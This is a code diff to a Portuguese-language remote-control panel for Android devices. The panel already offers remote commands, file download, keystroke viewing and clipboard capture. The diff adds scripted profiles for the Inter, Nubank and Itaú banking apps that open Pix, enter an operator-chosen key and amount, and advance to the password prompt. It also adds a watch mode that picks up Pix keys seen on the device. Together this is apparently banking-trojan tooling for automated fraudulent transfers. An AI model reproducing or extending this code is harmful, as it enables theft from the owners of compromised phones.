@@ -103,7 +103,7 @@ input{flex:1;cursor:text}
 <div class=ln>Res<input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
 </div>
 </aside></main>
-<div id=bar><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path"><button class=pri onclick="send()">Enviar</button>
+<div id=bar><select id=pfl></select><input id=pch placeholder="chave pix" style="flex:0 0 190px"><input id=pvl placeholder="valor" style="flex:0 0 80px"><button class=pri onclick="runPix()">Pix</button><button id=wt onclick="wt()">Watch</button><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path"><button class=pri onclick="send()">Enviar</button>
 <button onclick="k(66)">Enter</button><button onclick="k(67)">Del</button><button onclick="k(26)">Notif</button>
 <button onclick="c('clip')">Clip</button><button onclick="c('recon')">Reconectar</button></div>
 <script>
@@ -140,6 +140,7 @@ setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},400
       else if(x.t==='tree'){nos=x.o||[];if(tabNow==='txt')renderTree(x.o)}
       else if(x.t==='k'){if(tabNow==='tecla'&&!kpause)kcarrega()}
       else if(x.t==='info'&&tabNow==='info'){out.textContent=x.o}
+      else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm)$('#pch').value=mm[1].trim()}
       else log(x.t+': '+(x.o||''))}
   };
 }
@@ -311,6 +312,68 @@ function playM(){if(!mrec.length){log('nada gravado');return}c('macro',{s:mrec})
 function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
   if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
   c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
+const PERFIS = {
+"inter": [
+ {"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"nubank": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"itau": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+]
+};
+function pflUpd(){
+  const s=$('#pfl');s.innerHTML='';
+  Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
+    o.value=k;o.textContent=k;s.appendChild(o)});
+}
+function runPix(){
+  const k=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
+  if(!ch){log('sem chave pix');return}
+  c('run',{s:PERFIS[k],v:{chave:ch,valor:vl}});
+  log('perfil '+k+' chave '+ch+' valor '+(vl||'-'))
+}
+function wt(){
+  const b=$('#wt'),on=b.dataset.on!=='1';
+  b.dataset.on=on?'1':'0';b.style.background=on?'#1f4d7a':'';
+  c('watch',{on:on})
+}
+pflUpd();
 co();
 </script>"""
 
